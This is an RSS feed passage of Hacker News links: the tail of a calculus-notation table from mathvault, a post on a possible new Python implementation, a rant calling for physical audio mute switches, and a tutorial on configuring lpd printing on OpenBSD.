$\displaystyle \lim_{x \, \downarrow \, a} f(x)$</td><td><strong><a href="https://en.wikipedia.org/wiki/One-sided_limit" target="_blank" aria-label="Right-sided limit (opens in a new tab)" rel="noreferrer noopener">Right-sided limit</a></strong><br>(Limit of $f(x)$ as $x$ tends to $a$ from the right)</td><td>$\displaystyle \lim_{x \to 3^+} \dfrac{1}{x-3} = +\infty$</td></tr><tr><td>$\displaystyle \lim_{x \to a^-} f(x)$, $\displaystyle \lim_{x \, \uparrow \, a} f(x)$</td><td><strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/One-sided_limit" target="_blank">Left-sided limit</a></strong><br>(Limit of $f(x)$ as $x$ tends to $a$ from the left)</td><td>$\displaystyle \lim_{x \to 0^-} \sqrt{-x} = 0$</td></tr><tr><td>$\min (A)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Maxima_and_minima#In_relation_to_sets" target="_blank" aria-label="Minimum (opens in a new tab)" rel="noreferrer noopener">Minimum</a></strong> of set $A$</td><td>$\min (a_n) + \min (b_n) \le$ $\min (a_n + b_n)$</td></tr><tr><td>$\max (A)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Maxima_and_minima#In_relation_to_sets" target="_blank" aria-label="Maximum (opens in a new tab)" rel="noreferrer noopener">Maximum</a></strong> of set $A$</td><td>If $f$ is continuous on $[a, b]$, then $\max (f(x))$ exists on that interval.</td></tr><tr><td>$\inf (A)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Infimum_and_supremum" target="_blank" aria-label="Greatest lower bound (opens in a new tab)" rel="noreferrer noopener">Greatest lower bound</a></strong> of set $A$</td><td>$\inf\left(\left\{\dfrac{1}{n} \, \middle| \, n \in \mathbb{N} \right\}\right)$<br>$= 0$</td></tr><tr><td>$\sup (A)$</td><td><strong><a href="https://en.wikipedia.org/wiki/Infimum_and_supremum" target="_blank" aria-label="Least upper bound (opens in a new tab)" rel="noreferrer noopener">Least upper bound</a></strong> of set $A$</td><td>$\sup \left(\left\{x \in \mathbb{Q} \, \middle| \, x^2 &lt; 2 \right\}\right)$ $= \sqrt{2}$</td></tr><tr><td>$\liminf a_n$</td><td><strong><a aria-label="Limit infimum (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Limit_superior_and_limit_inferior" target="_blank">Limit inferior</a></strong> of sequence $a_n$</td><td>$\displaystyle \liminf_{n \to \infty} \dfrac{2}{n+1} =$<br>$\displaystyle \lim_{n \to \infty} 0$</td></tr><tr><td>$\limsup a_n$</td><td><strong><a href="https://en.wikipedia.org/wiki/Limit_superior_and_limit_inferior" target="_blank" aria-label="Limit superior (opens in a new tab)" rel="noreferrer noopener">Limit superior</a></strong> of sequence $a_n$</td><td>$\displaystyle \limsup_{n \to \infty} b_n =$<br>$\displaystyle \lim_{n \to \infty} \left( \sup_{m \ge n} b_m \right)$</td></tr></tbody></table></figure><h2><span id="Derivative_and_Integral"></span>Derivative and Integral<span></span></h2><p>The field of calculus (e.g., multivariate/vector calculus, differential equations) is often said to revolve around two opposing but complementary concepts: <strong>derivative</strong> and <strong>integral</strong>. The following tables document the most notable symbols related to these — along with each symbol’s usage and meaning.</p><p>(For a review on function and related operators, see <a href="https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/#Functionrelated_Symbols" target="_blank" rel="noopener noreferrer"><strong>function-related operators</strong></a>.)</p><h3>Univariate Derivative-related Symbols<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$f^{\prime}(\mathrm{x}), f^{\prime \prime}(\mathrm{x}), f^{(n)}(\mathrm{x})$</td><td>First, second and $n$th <strong><a aria-label="derivative (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Notation_for_differentiation#Lagrange's_notation" target="_blank">derivative</a></strong> of $f$ at $\mathrm{x}$<br>(Lagrange’s notation)</td><td>$f'(c) =$<br>$\displaystyle \lim_{h \to 0} \dfrac{f(c + h)-f(c)}{h}$</td></tr><tr><td>$\dfrac{d}{d\mathrm{x}} f, \dfrac{df}{d\mathrm{x}}$</td><td><strong><a aria-label="Derivative (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Notation_for_differentiation#Leibniz's_notation" target="_blank">Derivative</a></strong> of function $f$ in terms of $\mathrm{x}$<br>(Leibniz’s notation)</td><td>$\dfrac{d}{dx} f = f'(x)$</td></tr><tr><td>$\dfrac{d^n}{d\mathrm{x}^n} f, \dfrac{d^n f}{d\mathrm{x}^n}$</td><td><strong><a aria-label="Nth derivative (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Notation_for_differentiation#Leibniz's_notation" target="_blank">Nth derivative</a></strong> of function $f$ in terms of $\mathrm{x}$<br>(Leibniz’s notation)</td><td>$\dfrac{d^2 f}{dx^2} = \dfrac{d}{dx}\left(\dfrac{df}{dx}\right)$</td></tr><tr><td>$\dot{y}$, $\ddot{y}$, $\overset{n}{\dot{y}}$</td><td>First, second and $n$th <strong><a aria-label="derivative (opens in a new tab)" href="https://en.wikipedia.org/wiki/Notation_for_differentiation#Newton's_notation" target="_blank" rel="noreferrer noopener">derivative</a></strong> of $y$ in terms of time variable $t$<br>(Newton’s notation)</td><td>$\ddot{y}= \dfrac{d^2 y}{dt^2}$</td></tr><tr><td>$D(f), D^2(f), D^{n}(f)$</td><td>First, second and $n$th <strong><a href="https://en.wikipedia.org/wiki/Notation_for_differentiation#Euler's_notation" target="_blank" aria-label="derivative (opens in a new tab)" rel="noreferrer noopener">derivative</a></strong> of $f$<br>(Euler’s notation)</td><td>$D^2(f) = D(D(f))$</td></tr><tr><td>$\Delta \mathrm{x}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Delta_(letter)#Upper_case" target="_blank" aria-label="Increment (opens in a new tab)" rel="noreferrer noopener">Increment</a></strong> in variable $\mathrm{x}$</td><td>$\Delta y \approx f'(x) \Delta x$</td></tr><tr><td>$d \mathrm{x}$</td><td><strong><a aria-label="Differential (opens in a new tab)" href="https://en.wikipedia.org/wiki/Differential_(infinitesimal)" target="_blank" rel="noreferrer noopener">Differential</a> </strong>of variable $\mathrm{x}$</td><td>$dy = \dfrac{dy}{dx}\,  dx$</td></tr></tbody></table></figure><h3>Multivariate Derivative-related Symbols<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$f_\mathbf{x}$</td><td><strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Partial_derivative" target="_blank">Partial derivative</a></strong> of $f$ in terms of $\mathbf{x}$<br>(Lagrange’s notation)</td><td>$\displaystyle f_x (a, b) = \lim_{h \to 0}$<br>$\frac{f(a+h, \, b) \, – \, f(a,\, b)}{h}$</td></tr><tr><td>$\dfrac{\partial}{\partial \mathrm{x}} f, \dfrac{\partial f}{\partial \mathrm{x}}$</td><td><strong><a aria-label="Partial derivative (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Partial_derivative" target="_blank">Partial derivative</a></strong> of $f$ in terms of $\mathrm{x}$<br>(Leibniz’s style)</td><td>If $f$ has continuous second partial derivatives, then $\dfrac{\partial}{\partial  y}\dfrac{\partial f}{\partial x} = \dfrac{\partial}{\partial x}\dfrac{\partial f}{\partial y}$</td></tr><tr><td>$\dfrac{\partial^n}{\partial \mathrm{x}^<br>n} f, \dfrac{\partial^n f}{\partial \mathrm{x}^n}$</td><td><strong><a aria-label="Nth partial derivative (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Partial_derivative#Notation" target="_blank">Nth partial derivative</a></strong> of $f$ in terms of $\mathrm{x}$<br>(Leibniz’s style)</td><td>$\dfrac{\partial^2 f}{\partial y^2} = \dfrac{\partial}{\partial y}\dfrac{\partial f}{\partial y}$</td></tr><tr><td>$\partial_x f$</td><td><strong><a href="https://en.wikipedia.org/wiki/Partial_derivative" target="_blank" aria-label="Partial derivative (opens in a new tab)" rel="noreferrer noopener">Partial derivative</a></strong> of $f$ in terms of $x$<br>(Euler’s notation)</td><td>$\partial_{xy} f = \dfrac{\partial}{\partial y} \dfrac{\partial f}{\partial x}$</td></tr><tr><td>$\nabla_{\mathbf{v}} f$</td><td><strong><a aria-label="Directional derivative (opens in a new tab)" href="https://en.wikipedia.org/wiki/Directional_derivative" target="_blank" rel="noreferrer noopener">Directional derivative</a></strong> of $f$ with respect to direction $\mathbf{v}$</td><td>$\nabla_{\mathbb{v}} f(\mathbf{x}) =$<br>$\displaystyle \lim_{h \to 0} \dfrac{f(\mathbf{x}+h\mathbf{v})-f(\mathrm{x})}{h}$</td></tr><tr><td>$\partial \mathrm{x}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Differential_of_a_function#Differentials_in_several_variables" target="_blank" aria-label="Partial differential (opens in a new tab)" rel="noreferrer noopener">Partial differential</a></strong> of variable $\mathrm{x}$</td><td>$\dfrac{\partial f}{\partial x} dx \le df$</td></tr><tr><td>$df$</td><td><strong><a aria-label="Total differential (opens in a new tab)" href="https://en.wikipedia.org/wiki/Differential_of_a_function#Differentials_in_several_variables" target="_blank" rel="noreferrer noopener">Total differential</a></strong> of function $f$</td><td>$df = \dfrac{\partial f}{\partial x_1} dx_1 +$<br>$\displaystyle \cdots + \dfrac{\partial f}{\partial x_n} dx_n$</td></tr><tr><td>$\nabla f, \mathrm{grad}\,f$</td><td><strong><a href="https://en.wikipedia.org/wiki/Gradient" target="_blank" aria-label="Gradient (opens in a new tab)" rel="noreferrer noopener">Gradient</a></strong> of function $f$</td><td>$\nabla f =$<br>$\left( \dfrac{\partial f}{\partial x_1}, \ldots, \dfrac{\partial f}{\partial x_n} \right)$</td></tr><tr><td>$\Delta f$</td><td><strong><a href="https://en.wikipedia.org/wiki/Laplace_operator#Definition" target="_blank" aria-label="Laplace operator (opens in a new tab)" rel="noreferrer noopener">Laplace operator</a></strong> of function $f$</td><td>$\displaystyle \Delta f = \sum_{i=1}^n \dfrac{\partial^2 f}{\partial x_i^2}$</td></tr><tr><td>$\nabla \cdot \mathbf{F}, \mathrm{div}\, \mathbf{F}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Divergence" target="_blank" aria-label="Divergence (opens in a new tab)" rel="noreferrer noopener">Divergence</a></strong> of vector field $\mathbf{F}$</td><td>$\nabla \cdot \mathbf{F} = \dfrac{\partial F_x}{\partial x} +$<br>$\dfrac{\partial F_y}{\partial y} + \dfrac{\partial F_z}{\partial z}$</td></tr><tr><td>$\nabla \times \mathbf{F}, \mathrm{curl} \, \mathbf{F}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Curl_(mathematics)" target="_blank" aria-label="Curl (opens in a new tab)" rel="noreferrer noopener">Curl</a></strong> of vector field $\mathbf{F}$</td><td>$\nabla \times \mathbf{F} =$<br>$\left( \dfrac{\partial}{\partial x}, \dfrac{\partial}{\partial y}, \dfrac{\partial}{\partial z} \right) \times$<br>$\left( F_x, F_y, F_z \right)$</td></tr></tbody></table></figure><h3><span id="Derivative/Integralrelated_Shorthands"></span>Derivative/Integral-related Shorthands<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$\displaystyle \left. f(x) \right|_{x = a}$</td><td><strong>Shorthand</strong> for ‘$f(x)$ with $x$ substituted by $a$’</td><td>$\displaystyle \left. f'(x) \right|_{x =g(t)} =$<br>$f'(g(t))$</td></tr><tr><td>$\displaystyle \left[f(x)\right]_{a}^{b}$</td><td><strong>Shorthand</strong> for <br>‘$f(b)-f(a)$’</td><td>$\left[\dfrac{x^2}{2}\right]_{1}^{\pi} = \dfrac{\pi^2}{2}-\dfrac{1}{2}$</td></tr></tbody></table></figure><h3>Univariate Integral-related Symbols<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$\displaystyle \int_a^b f(x) \, dx$</td><td><strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Integral" target="_blank">Integral</a></strong> of function $f$ with respect to $x$ from $a$ to $b$</td><td>$\displaystyle \int_0^{\infty} \dfrac{1}{1+x^2} \, dx = \dfrac{\pi}{2}$</td></tr><tr><td>$\displaystyle \int f(x) \, dx$</td><td><strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Antiderivative#Uses_and_properties" target="_blank">Indefinite integral</a></strong> of function $f$ with respect to $x$</td><td>$\displaystyle \int \cos y \, dy = \\ \sin y + C$</td></tr><tr><td>$F(x)$</td><td><strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Antiderivative" target="_blank">Antiderivative</a></strong> of function $f$</td><td>For all constants $c$, $(F(x) + c)’ = f(x)$.</td></tr><tr><td>$(Jf)(x)$</td><td><strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Fractional_calculus" target="_blank">Integration operator</a></strong><br>(Integral function of $f$)</td><td>$(Jf)(x) =$<br>$\displaystyle \int_0^x f(t) \, dt$</td></tr></tbody></table></figure><h3>Multivariate Integral-related Symbols<span></span></h3><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$\displaystyle \int_C f(\mathbf{r}) \, ds$</td><td><strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Line_integral#Definition" target="_blank">Line integral</a></strong> of function $f$ along curve $C$ (under parametrization $\mathbf{r}$)</td><td>$\displaystyle \int_C f(\mathbf{r}) \, d s =$<br>$\displaystyle \int_a^b f(\mathbf{r}(t)) \, |\mathbf{r}'(t)| \, d t$</td></tr><tr><td>$\displaystyle \int_{C} f(z) \, dz$, $\displaystyle \oint_{C} f(z) \, dz$</td><td><strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Contour_integration#For_continuous_functions" target="_blank">Contour integral</a></strong> of function $f$ along curve $C$</td><td>$\displaystyle \int_{\gamma} f(z) \, dz =$<br>$\displaystyle \int_a^b f(\gamma(t)) \, \gamma'(t) \, dt$</td></tr><tr><td>$\displaystyle \int_C \mathbf{F}(\mathbf{r}) \cdot d\mathbf{r}$</td><td><strong><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Line_integral#Definition_2" target="_blank">Line integral</a></strong> of vector field $\mathbf{F}$ along curve $C$</td><td>$\displaystyle \int_C \mathbf{F}(\mathbf{r}) \cdot d \mathbf{r} =$<br>$\displaystyle \int_a^b \mathbf{F}(\mathbf{r}(t)) \cdot \mathbf{r}'(t) \, d t$</td></tr><tr><td>$\displaystyle \iint_D f …</td></tr></tbody></table></figure></section></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mathvault.ca/hub/higher-math/math-symbols/calculus-analysis-symbols/">https://mathvault.ca/hub/higher-math/math-symbols/calculus-analysis-symbols/</a></em></p>]]>
            </description>
            <link>https://mathvault.ca/hub/higher-math/math-symbols/calculus-analysis-symbols/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24535853</guid>
            <pubDate>Sun, 20 Sep 2020 18:03:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Waiting for the Next Python Implementation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24535503">thread link</a>) | @pcr910303
<br/>
September 20, 2020 | http://ballingt.com/next-python/ | <a href="https://web.archive.org/web/*/http://ballingt.com/next-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>The time may be ripe for a new Python implementation.</p>
<p>A <a href="https://www.youtube.com/watch?v=ITksU31c1WY">lot</a> <a href="https://www.youtube.com/watch?v=KDXhu4rxTNY">of</a> <a href="https://www.youtube.com/watch?v=ftP5BQh1-YM">keynotes</a> lately have called for one anyway. They are joined — informally, not speaking in an official capacity — by Python core developers in issuing a wakeup call: where is Python in the browser? Where is Python on mobile devices? How could Python be 2x faster?</p>
<p>Barry Warsaw at the <a href="https://youtu.be/8dDp-UHBJ_A?t=2288">PyCon 2019 Python Steering Council Panel Keynote</a>:</p>
<blockquote>
<p>The language is pretty awesome.
[…]
The interpreter, in a sense, is 28 years old.</p>
</blockquote>
<p>Such a new Python implementation might be faster, work on different platforms, or have a smaller end deliverable.</p>
<p>It might accomplish these goals with a just-in-time or ahead-of-time compiler.</p>
<p>WebAssembly might significantly influence its implementation.</p>
<p>And critically, it might implement a different specification of Python.</p>
<hr>
<p>Wait, what? Will this still be Python?</p>
<p>If the new implementation is useful enough and has a level of compatibility with CPython that the community can deal with, (Brett Cannon said <a href="https://talkpython.fm/episodes/transcript/213/webassembly-and-cpython">something like this on a podcast</a> a few months ago) then it might somehow be canonized.</p>
<p>This “Optimizable Python” or “Restricted Python” or “Fast Python” or “Static Python” or “Boring Python,” subset could, once agreed upon, have its semantics shadowed in CPython in an optional mode.</p>
<p>What might be up for debate? A few suggestions from <a href="https://youtu.be/KDXhu4rxTNY?t=1168">Łukasz’s talk</a>:</p>
<ul>
<li>eval / exec (compiled in an environment that doesn’t allow setting regions as executable, like iOS or (perhaps? I haven’t looked) the webassembly spec.</li>
<li>the complexities and dynamism of the import system.</li>
<li>metaclasses - I don’t know what this enables, but it seems like a concession parts of the community might be willing to make</li>
<li>descriptors</li>
<li>dynamic attribute access</li>
</ul>
<hr>
<p>So now that the Python 2 to 3 transition is wrapping up and the Python language’s governance issues have been dealt with, it’s time for some dramatic initiatives: let’s grab some stakeholders and come up with the parts of the Python spec to mark optional and get this into CPython so we can start porting code again! I propose <code>python -z</code> for zoom — there we go, ZoomPython! — because I don’t see <code>-z</code> in python or IPython command line tools. We’ll need some syntax like JavaScript’s <code>use strict</code> to mark code this way, I propose the magic string <code># this code zooms</code>. Can the committee just tell us what the new spec is already?</p>
<p>No! Or as Łukasz Langa says <a href="https://youtu.be/KDXhu4rxTNY?t=2470">in response to a a better question after his keynote</a>,</p>
<blockquote>
<p>“Yes, but the way you get there is to have an alternative platform that informs you what the constrained version of the language should be. If you try to predict the future of what are people are going to need, you’re likely to end up with a design that is artificial and not necessarily useful.”</p>
</blockquote>
<p>So we’re back to the hoping and waiting and wondering: where will the implementation proposal for FastPython come from?</p>
<hr>
<p>Despite some <a href="https://youtu.be/ftP5BQh1-YM?t=2898">calls for financially support of such an effort</a> it seems that leading the prototyping of a new language implementation is not at the top of the priority list for committee. Core developers and language steering committee members seem to believe that this kind of experimental project should come from the outside. (try searching for the word Community in the transcript of <a href="https://talkpython.fm/episodes/transcript/213/webassembly-and-cpython">the podcast Brett was on</a>) This makes sense to me.</p>
<p>PyPy is the second-most popular Python implementation. It’s “bug-compatible” with CPython, including the C extension interface, making it a viable drop-in, faster replacement for many CPython programs. It’s an incredible engineering effort, perhaps comparable in scope to the work optimizing JavaScript engines that made that language the fasted dynamically typed language in wide use. If dedicated graduate student and individual hackers, academic funding, and governments grants could make a Python so compliant and fast a Python implementation once, maybe that’s where the next implementation will come from too!</p>
<p>MicroPython is closer in design to an imagined implementation of the future: its behavior is <a href="https://docs.micropython.org/en/latest/genrst/index.html">different than CPython in a variety of cases</a> and includes <a href="https://docs.micropython.org/en/latest/reference/speed_python.html#the-native-code-emitter">the ability to compile individual functions</a> that do not use features like context managers and generators. MicroPython was initially a Kickstarter-backed effort, then later supported by the Python Software Foundation <a href="https://en.wikipedia.org/wiki/MicroPython">as part of its inclusion on the BBC Micro Bit</a>. The development of MicroPython provides an example of how an alternate implementation might be started by a single individual.</p>
<p>But I think the most likely place for a new implementation to come from is a large company that uses Python and has a specific need for a new interpreter. This belief comes from my time at Dropbox, where I’ve seen how projects to improve languages can happen at a company of that size: since we had so many programmers working on so much Python code, better Python tooling would be so useful a case could be made for doing it ourselves. At Dropbox this project has been the Mypy Python static type checker, but I could imagine similar projects to write language implementations. (I’m not imagining too hard; Dropbox is also supporting work on mypyc, a Python compiler I’ll discuss more in a future post.)</p>
<p>If you are employed at such a company, it’s hard for me to know how to help you make the business case, but know that it has been done before! Please consider it.</p>
<p>Where would that be? A lot of companies! Some of my favorite corporate contributions to the Python community have come from Dropbox and Instagram, but Python isn’t a niche thing anymore and there must be dozens? hundreds? of companies with idiosyncratic business interests such that a Python implementation that ran in the browser, or ran faster, or ran sandboxed, would save them millions of dollars.</p>
<hr>
<p>In <a href="https://youtu.be/KDXhu4rxTNY?t=962">his inspirational keynote</a>, Łukasz phrased this as a call to action:</p>
<blockquote>
<p>This is where you come in. Truly tremendous impact awaits!</p>
</blockquote>
<p>I don’t think I’ll be one the call-answerers here, but I wish these implementers the best!</p>
<p>I think I support the apparent decision for the search for the next implementation not to be centrally directed; I agree that this can come from the community, and the proof of its usefulness can too. But there is something I think we can do centrally.</p>
<p>Without pre-emptively deprecating Python language features or designating them as optional, Python can be made a more attractive implementation target by making it smaller in a another way: separating the language from standard library.</p>
<p>Glyph proposes moving CPython <a href="https://glyph.twistedmatrix.com/2019/06/kernel-python.html">toward a Kernel Python</a> for a variety of reasons. I find that case convincing.</p>

</div></div>]]>
            </description>
            <link>http://ballingt.com/next-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24535503</guid>
            <pubDate>Sun, 20 Sep 2020 17:29:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We need physical audio kill switches]]>
            </title>
            <description>
<![CDATA[
Score 444 | Comments 430 (<a href="https://news.ycombinator.com/item?id=24535408">thread link</a>) | @stargrave
<br/>
September 20, 2020 | https://rubenerd.com/we-need-physical-audio-kill-switches/ | <a href="https://web.archive.org/web/*/https://rubenerd.com/we-need-physical-audio-kill-switches/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div property="articleBody">
<p>(Update: I didn’t mention this concerned <strong>wired</strong> headphones).</p>
<p>I aggressively disagree with any computer design decisions that detract from ergonomics or health, and nowhere does this continue to remain bafflingly true than audio output. Strap in, I’m about to get a bit ranty!</p>
<p>If we encounter an unwanted audio signal emanating from our computers, especially an uncomfortably-loud one over headphones, we should <em>immediately</em> be able to terminate it. No exceptions. If there is any latency <em>whatsoever</em> between us hitting a mute button and the audio not cutting out, the hardware or software has failed. Crypton Future Media’s Hatsune Miku wouldn’t tolerate latency with her headphones, and neither should we.</p>
<p><img src="https://rubenerd.com/files/2020/miku-headphones@1x.jpg" srcset="https://rubenerd.com/files/2020/miku-headphones@1x.jpg 1x, https://rubenerd.com/files/2020/miku-headphones@2x.jpg 2x" alt=""></p>
<p>I was in a conference call last Friday where I’d adjusted the volume up to compensate for the client’s quiet microphone, only to be audibly shot in the ears by an auto-playing video on a website. There is a <em>lot</em> of problematic stuff to unpack there, much of which is not the fault of the audio hardware or OS. But shocked in the moment, I hit the mute button on my MacBook Pro Touchbar, and it took a solid two seconds for it to register. My ears were ringing throughout the whole call. <em>This is unacceptable.</em></p>
<p>Well-engineered mute buttons on keyboards shouldn’t need to go to software, they should immediately send a signal to the motherboard’s DAC—ideally on a separate wire or connection—to say <em>terminate this signal</em>. Then it’s less of a concern if it takes the OS a few seconds to react to the change, because our ears have been spared.</p>
<p id="just-ackchyually">The <em>just ackchyually</em> crowd would don their Captain Obvious capes and brightly-coloured underwear to proclaim that people could <em>just</em> unplug their headphones, or rip them off ones head when suddenly inundated with loud audio. Sure, and if you start getting electric shocks from your keyboard you could <em>just</em> use an external one, bro. Or if you get your hand caught in a mixer, <em>just</em> use your other hand, that’s why you have two of them. There are so many reasons why this dismissive attitude is specious, but even if it weren’t, it would still take more physical effort <em>than a button</em>. And if a mute button doesn’t fulfill the function for which it’s labelled and designed, what’s the point of it? But then, these people know all that, they’re just being obtuse.</p>
<p>We have valid privacy arguments advocating for physical Wi-Fi, camera, and microphone buttons; I’d say audio should be voiced in these discussions too. They should be heard. Sound ideas should be reverberated. Miku.</p>
</div></div>]]>
            </description>
            <link>https://rubenerd.com/we-need-physical-audio-kill-switches/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24535408</guid>
            <pubDate>Sun, 20 Sep 2020 17:19:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Basic Printing on OpenBSD]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 27 (<a href="https://news.ycombinator.com/item?id=24535357">thread link</a>) | @paedubucher
<br/>
September 20, 2020 | https://paedubucher.ch/articles/2020-09-20-basic-printing-on-openbsd.html | <a href="https://web.archive.org/web/*/https://paedubucher.ch/articles/2020-09-20-basic-printing-on-openbsd.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I have a roughly ten year old Brother HL-5370DW printer on the shelf next to me.
This printer is mostly used by my wife to print sewing patterns. When I was
studying computer science, I sometimes printed documents I've written for
proofreading. I often was able to find typos that I didn't see on the screen
even after proofreading the document two or three times. However, I didn't
bother to print out my bachelor thesis. Printing 120 pages just for proofreading
just seemed a waste to me. I did my proofreading on the screen extra carefully,
and nobody complained about typos. (Which doesn't mean that there were none.)</p>
<p>Having finished my studies, I hardly ever print out documents. However, I still
prefer to read long texts on paper rather than on the screen. Therefore I often
buy technical books as paperbacks or hardcovers rather than ebooks. And if I buy
an ebook with demanding content, I print out those sections for offline reading.</p>
<p>Having switched to OpenBSD for my private computing shifted my reading habits
more towards manpages. When I need to figure out how something works on
OpenBSD, <code>apropos(1)</code> beats Google as a starting point in many cases. Some
manpages are really long, for example <code>ksh(1)</code>. I have a book on the Korn Shell
in my basement, which covers <code>ksh93</code>.  However, there are some differences
between <code>ksh93</code> and OpenBSD's <code>pdksh</code>. So reading the manpage not only gives me
more accurate information, but also <em>less</em> to read.</p>
<p>So why not printing out the manpage <code>ksh(1)</code>? I can do so even nicely formatted
using PostScript:</p>
<pre><code>$ man -T ps -O paper=a4 ksh &gt;ksh.1.ps
</code></pre>
<p>Now <code>ksh.1.ps</code> can be read with <code>zathura(1)</code>, given that the package
<code>zathura-ps</code> is installed:</p>
<pre><code># pkg_add zathura zathura-ps
$ zathura ksh.1.ps
</code></pre>
<p>But why using PostScript and not PDF like anybody else for the last twenty five
years? Because PostScript is the least common denominator and, thus, supported
out of the box by OpenBSD. (For fancier printing options, check out <code>cups</code>, but
I'd like to keep it minimalistic for the moment.)</p>

<p>I figured out how to configure my printer by reading the section <em>The lpd
Printing Daemon</em> in the 16th chapter of <a href="https://nostarch.com/obenbsd2e">Absolute OpenBSD (2nd
Edition)</a> (p. 306-307) by <a href="https://mwl.io/">Michael W
Lucas</a>. This is how I applied the configuration to my local
setup.</p>
<p>First, I created the file <code>/etc/printcap</code> with the following content:</p>
<pre><code>lp|brother:\
    :sh=:\
    :rm=192.168.178.52:\
    :sd=/var/spool/output/brother:\
    :lf=/var/log/lpd-errs:\
    :rp=brother
</code></pre>
<p>There must be a newline at the end of the file. The line breaks are escaped
using backslashes, except for the last line. The options are defined as follows:</p>
<ul>
<li>The first line defines two names for my printer: <code>lp</code>, which should always be
  there, and <code>brother</code>, which is my arbitrary name for the printer.</li>
<li>The second line (<code>sh</code>) defines that no <em>burst page</em> (summarizing the last
  print job on a special page) should be printed.</li>
<li>The third line (<code>rm</code>) refers to the printer on the network. My FritzBox always
  gives the same IP to my printer. It's also possible to use the printer's
  hostname.</li>
<li>The fourth line (<code>sd</code>) defines the spooler directory for this printer. Print
  jobs are written into that directory.</li>
<li>The fifth line (<code>lf</code>) defines a log file for error messages, which you hopefully
  never need to check.</li>
<li>The sixth line (<code>rp</code>) defines the remote printer name.</li>
</ul>
<p>Next, the spooler directory needs to be created. It must be owned by the user
<code>root</code> and the group <code>daemon</code>. Regular users need write access to this directory
in order to print documents:</p>
<pre><code># mkdir /var/spool/output/brother
# chown -R root:daemon /var/spool/output/brother
# chmod 770 /var/spool/output/brother
</code></pre>
<p>Now the printer daemon <code>lpd</code> needs to be activated. To do so on system startup,
add the following line to <code>/etc/rc.conf/local</code>:</p>
<pre><code>lpd_flags=""
</code></pre>
<p>Then start the service:</p>
<pre><code># /etc/rc.d/lpd restart
</code></pre>
<p><strong>Update (2020-09-21)</strong>: As one reader on
<a href="https://news.ycombinator.com/item?id=24535357#24538879">Hacker News</a> pointed
out, the last two steps can be performed using <code>rcctl(8)</code>:</p>
<pre><code># rcctl enable lpd
# rcctl restart lpd
</code></pre>
<p>The manpage says that <code>rcctl(8)</code> was introduced in OpenBSD 5.7 back in 2015.
<em>Absolute OpenBSD (2nd Edition)</em> is from 2013 and, thus, older than that. (At
the time of this writing, I'm using Version 6.7.)</p>
<p>Another reader pointed out that setting the access rights to <code>777</code> is a bad
practice. That's true, and I actually got the reasoning behind this wrong: I
thought any user must be able to write to the spooler, because any user is
supposed to print. However, it's <code>lpd</code> that is writing to the spooler, which of
course runs under the <code>daemon</code> group. Therefore, the access rights for
<code>/var/spool/output/brother</code> should be set to <code>770</code>, not to <code>777</code> (as corrected
above).</p>

<p>Now the printer is ready to accept jobs. In order to print the PostScript file
generated before, just run <code>lpr</code> on the file:</p>
<pre><code>$ lpr ksh.1.ps
</code></pre>
<p>It's also possible to send the PostScript output directly to the printer (this
is Unix, after all), if no preview is needed:</p>
<pre><code>$ man -T ps -O paper=a4 ksh | lpr
</code></pre>
<p>Printing plain text files behaved strange on my setup, but could to using the
<code>pr</code> formatter with <code>lpr</code> as follows:</p>
<pre><code>$ lpr -p plain.txt
</code></pre>
<p>Instead, I also convert plain text files to PostScript, which looks quite nice
on paper. I use <code>enscript(1)</code> for this task:</p>
<pre><code># pkg_add enscript
$ enscript plain.txt -o plain.ps
$ lpr plain.ps
</code></pre>
<p>PDFs can also be converted to PostScript using <code>pdf2ps(1)</code>, which comes with
GhostScript, i.e. the <code>ghostscript</code> package:</p>
<pre><code>$ pdf2ps document.pdf document.ps
</code></pre>
